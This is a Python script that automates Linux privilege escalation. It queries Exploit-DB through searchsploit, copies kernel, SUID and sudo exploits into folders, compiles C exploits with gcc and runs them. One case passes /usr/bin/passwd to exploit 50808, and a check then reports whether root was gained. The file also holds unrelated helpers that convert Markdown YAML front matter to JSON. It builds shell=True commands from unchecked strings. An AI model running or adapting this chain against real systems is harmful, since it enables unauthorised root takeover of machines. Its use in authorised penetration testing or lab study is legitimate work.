
import subprocess
import json
import jsonschema
import os
import sys
import yaml
import re
import glob

def execute_command(command):
    """
    Executes a command on the terminal and returns its output.
    """
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    process.wait()
    stdout, stderr = process.communicate()
    return stdout
def search_exploits(quary):
    """
    Searches for exploits using searchsploit based on the kernel version.
    """
    command = f"searchsploit {quary} --www"
    output = execute_command(command)
    return output


def extract_exploit_ids(exploits_output):
    """
    Extracts exploit IDs from the searchsploit output.
    """
    exploit_ids = re.findall(r'/exploits/(\d+)', exploits_output)
    return exploit_ids


def ensure_directory(directory):
    """
    Ensures that a directory exists; creates it if it doesn't.
    """
    if not os.path.exists(directory):
        os.makedirs(directory)


def get_subfolder_name(list_of_vector):
    """
    Returns the subfolder name based on the list_of_vector.
    """
    # Define mappings for list_of_vector to subfolder names
    vector_to_subfolder = {
        "Kernel": "kernel_exploits",
        "SUID": "SUID_exploits",
        "SUDO": "Sudo_exploits"
        # Add more mappings as needed
    }

    # Default subfolder name if not found in the mappings
    default_subfolder = "other_exploits"

    # Return the subfolder name based on list_of_vector
    return vector_to_subfolder.get(list_of_vector, default_subfolder)


def copy_exploit(exploit_id, list_of_vector, directory="exploits"):
    """
    Copies an exploit to the specified directory and subfolder based on list_of_vector using searchsploit's -m option.
    """
    # Save the original directory
    original_directory = os.getcwd()

    # Ensure the main directory exists
    ensure_directory(directory)

    # Determine the subfolder based on list_of_vector
    subfolder = os.path.join(directory, get_subfolder_name(list_of_vector))
    ensure_directory(subfolder)

    # Change the current working directory to the subfolder
    os.chdir(subfolder)

    # Check if the exploit file already exists, and if so, delete it
    exploit_file = f"{exploit_id}.c"
    if os.path.exists(exploit_file):
        os.remove(exploit_file)

    # Copy the exploit
    command = f"searchsploit -m {exploit_id}"
    result = execute_command(command)

    # Change back to the original directory if needed
    os.chdir(original_directory)

    print(result)
def compile_exploit(exploit_file):
    """
    Compiles an exploit file if it's a C file.
    """
    if not exploit_file.endswith('.c'):
        print("The exploit file does not appear to be a C file. Skipping compilation.")
        return None
    # Assuming the exploit file is a C file, compile it
    compiled_name = exploit_file.replace('.c', '')
    compile_command = f"gcc {exploit_file} -o {compiled_name} -pthread"
    try:
        execute_command(compile_command)
        print(f"Compiled {exploit_file} successfully.")
        return compiled_name
    except Exception as e:
        print(f"Failed to compile {exploit_file}: {e}")
        return None

def run_exploit(exploit_executable, vector, exploit_id):
    """
    Executes the compiled exploit or a script.
    """
    if not exploit_executable:
        print("No executable provided to run.")
        return

    run_command = f"./{exploit_executable}"

    match vector:
        case 'Kernel':
            if exploit_id == '50808':
                run_command += " /usr/bin/passwd"
                print(f"Exploiting Kernel vulnerability with ID {exploit_id} using /usr/bin/passwd as an additional parameter.")
        case 'SUID':
            # Handle SUID vector if needed
            pass
        case _:
            print(f"Vector {vector} is not supported. Skipping exploit execution.")

    try:
        print(f"Running exploit: {exploit_executable}")
        output = execute_command(run_command)
        print(output)
    except Exception as e:
        print(f"Failed to run exploit {exploit_executable}: {e}")

def am_i_root():
    if os.geteuid() == 0:
        print("I am root now!")
    else:
        print("Still not root.")



def parse_yaml_from_md(md_path):
    """Extracts and parses the YAML front matter from a Markdown file."""
    with open(md_path, 'r') as file:
        content = file.read()
        # Assuming the YAML front matter is at the start of the file and delimited by '---'
        yaml_content = content.split('---')[1]
        return yaml.load(yaml_content, Loader=yaml.SafeLoader)


def convert_md_to_json(md_path, json_path):
    """Converts a Markdown file to JSON format based on the specified schema."""
    data = parse_yaml_from_md(md_path)
    # Here you would transform 'data' as needed to fit your JSON schema
    # This step is highly dependent on the structure of your YAML and your schema requirements

    with open(json_path, 'w') as json_file:
        json.dump(data, json_file, indent=4)


def iterate_and_convert_md_to_json(directory):
    """Iterates through all Markdown files in the directory and converts them to JSON."""
    for md_file in glob.glob(os.path.join(directory, '*.md')):
        # Generate the path for the corresponding JSON file
        json_file_name = os.path.splitext(os.path.basename(md_file))[0] + '.json'
        json_file_path = os.path.join(directory, json_file_name)

        # Convert the Markdown file to JSON
        convert_md_to_json(md_file, json_file_path)
        print(f"Converted {md_file} to JSON at {json_file_path}")
